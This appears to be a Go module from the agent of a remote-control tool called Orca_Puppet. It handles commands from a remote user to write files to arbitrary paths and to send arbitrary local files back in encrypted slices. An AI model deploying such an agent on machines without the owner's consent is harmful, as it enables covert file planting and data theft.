package controller

import (
	"Orca_Puppet/cli/cmdopt/fileopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/define/retcode"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"os"
	"time"
)

func fileUploadCmd(sendUserId, decData string) {
	// 获取id对应的管道
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	defer setchannel.DeleteFileSliceDataChan(sendUserId)
	// 获取文件元信息
	var fileMetaInfo fileopt.FileMetaInfo
	err := json.Unmarshal([]byte(decData), &fileMetaInfo)
	if err != nil {
		return
	}
	saveFile := fileMetaInfo.SaveFileName
	sliceNum := fileMetaInfo.SliceNum
	md5sum := fileMetaInfo.Md5sum

	pSaveFile, _ := os.OpenFile(saveFile, os.O_CREATE|os.O_RDWR, 0600)
	defer pSaveFile.Close()

	// 循环获取分片数据
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			pSaveFile.Write(metaData.([]byte))
		case <-time.After(5 * time.Second):
			common.SendFailMsg(sendUserId, common.ClientId, "file upload failed", "")
			debug.DebugPrint(sendUserId + " upload file error")
			setchannel.DeleteFileSliceDataChan(sendUserId)
			return
		}
	}
	saveFileMd5 := util.GetFileMd5Sum(saveFile)
	if md5sum == saveFileMd5 {
		data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "file upload success")
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
	} else {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "fileUpload_ret", outputMsg)
	}
}

func fileDownloadCmd(sendUserId, decData string) {
	var requestFile fileopt.RequestFile
	err := json.Unmarshal([]byte(decData), &requestFile)
	if err != nil {
		return
	}
	destFile := requestFile.DestFileName
	saveFile := requestFile.SaveFileName
	if !fileopt.IsFile(destFile) {
		failMsg := colorcode.OutputMessage(colorcode.SIGN_ERROR, "dest file is not exist")
		common.SendFailMsg(sendUserId, common.ClientId, failMsg, "")
		return
	}
	metaInfoMsg := fileopt.GetFileMetaInfo(destFile, saveFile)
	retData := fileopt.SendFileMetaMsg(sendUserId, metaInfoMsg)
	if retData.Code != retcode.SUCCESS {
		debug.DebugPrint("send failed")
	}
	// 分片发送文件
	fileopt.SendFileData(sendUserId, destFile)
}
